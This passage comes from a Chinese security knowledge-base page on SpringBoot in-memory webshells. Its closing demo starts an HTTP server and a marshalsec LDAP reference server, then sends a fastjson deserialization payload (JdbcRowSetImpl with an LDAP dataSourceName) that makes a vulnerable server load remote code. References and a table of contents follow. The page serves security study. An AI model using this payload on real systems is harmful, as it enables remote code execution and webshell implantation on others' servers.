<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> http.server </span><span class="token number" style="color:#36acaa">8000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>启动ldap服务</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-cp</span><span class="token plain"> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/</span><span class="token comment" style="color:#999988;font-style:italic">#Test 8088</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>然后用fastjson payload打过去</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;a&quot;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;b&quot;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:8088/Test&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;autoCommit&quot;: true</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>效果</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211125140248843" src="/assets/images/image-20211125140248843-2846abf27e16e8a204b777f642809774.png" width="2612" height="1104" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20211125140259154" src="/assets/images/image-20211125140259154-d9b2b6cc6c1f1b3f3ac46ce20a648041.png" width="2710" height="712" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考">参考<a href="#参考" class="hash-link" aria-label="参考的直接链接" title="参考的直接链接">​</a></h2>
<ul>
<li><a href="https://jishuin.proginn.com/p/763bfbd642b7" target="_blank" rel="noopener noreferrer">深入浅出内存马(二) 之SpringBoot内存马（文末视频教学）</a></li>
<li><a href="https://www.cnblogs.com/bitterz/p/14859766.html" target="_blank" rel="noopener noreferrer">针对Spring MVC的Interceptor内存马</a></li>
<li><a href="https://www.anquanke.com/post/id/198886" target="_blank" rel="noopener noreferrer">基于内存 Webshell 的无文件攻击技术研究</a></li>
<li><a href="https://mp.weixin.qq.com/s/LbiMAhUdL8-K1uDjKIevJA" target="_blank" rel="noopener noreferrer">一文了解内存马</a>： 最下面很多参考链接</li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/内存马/Tomcat内存马"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Tomcat内存马</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/内存马/Java Agent 内存马"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Java Agent 内存马</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#前言" class="table-of-contents__link toc-highlight">前言</a></li><li><a href="#基础知识" class="table-of-contents__link toc-highlight">基础知识</a><ul><li><a href="#bean" class="table-of-contents__link toc-highlight">Bean</a></li><li><a href="#applicationcontext" class="table-of-contents__link toc-highlight">ApplicationContext</a></li><li><a href="#其他" class="table-of-contents__link toc-highlight">其他</a><ul><li><a href="#root-context-和-child-context" class="table-of-contents__link toc-highlight">Root Context 和 Child Context</a></li><li><a href="#contextloaderlistener" class="table-of-contents__link toc-highlight">ContextLoaderListener</a></li><li><a href="#dispatcherservlet" class="table-of-contents__link toc-highlight">DispatcherServlet</a></li></ul></li></ul></li><li><a href="#controller实现方式" class="table-of-contents__link toc-highlight">Controller实现方式</a></li><li><a href="#controller技术实现" class="table-of-contents__link toc-highlight">Controller技术实现</a><ul><li><a href="#获取上下文的环境" class="table-of-contents__link toc-highlight">获取上下文的环境</a></li><li><a href="#手动注册controller" class="table-of-contents__link toc-highlight">手动注册Controller</a><ul><li><a href="#方法一" class="table-of-contents__link toc-highlight">方法一</a></li><li><a href="#方法二" class="table-of-contents__link toc-highlight">方法二</a></li><li><a href="#方法三detecthandlermethods" class="table-of-contents__link toc-highlight">方法三：detectHandlerMethods</a></li></ul></li><li><a href="#webshell" class="table-of-contents__link toc-highlight">webshell</a></li><li><a href="#注意事项" class="table-of-contents__link toc-highlight">注意事项</a></li></ul></li><li><a href="#springboot生命周期" class="table-of-contents__link toc-highlight">SpringBoot生命周期</a></li><li><a href="#interceptor实现" class="table-of-contents__link toc-highlight">Interceptor实现</a><ul><li><a href="#拦截器代码" class="table-of-contents__link toc-highlight">拦截器代码</a></li><li><a href="#正常注册拦截器" class="table-of-contents__link toc-highlight">正常注册拦截器</a></li><li><a href="#效果" class="table-of-contents__link toc-highlight">效果</a></li><li><a href="#恶意注册拦截器" class="table-of-contents__link toc-highlight">恶意注册拦截器</a></li></ul></li><li><a href="#应用场景" class="table-of-contents__link toc-highlight">应用场景</a><ul><li><a href="#漏洞演示" class="table-of-contents__link toc-highlight">漏洞演示</a></li></ul></li><li><a href="#参考" class="table-of-contents__link toc-highlight">参考</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>